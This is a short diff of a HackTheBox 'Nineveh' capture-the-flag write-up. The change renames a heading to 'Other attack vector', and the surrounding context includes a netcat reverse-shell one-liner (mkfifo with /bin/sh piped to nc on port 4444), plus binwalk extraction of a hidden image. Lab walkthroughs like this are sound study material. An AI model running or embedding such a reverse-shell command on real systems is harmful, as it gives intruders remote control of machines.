@@ -105,7 +105,7 @@ www-data@nineveh:/var/tmp$ ./procmon.sh
 rm /tmp/3;mkfifo /tmp/3;cat /tmp/3|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/3
 --------------------------------------------------------------------
 ```
-#### ~Other way~
+### Other attack vector:
 https://10.10.10.43/secure_notes/
 Show hidden content: 
 root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
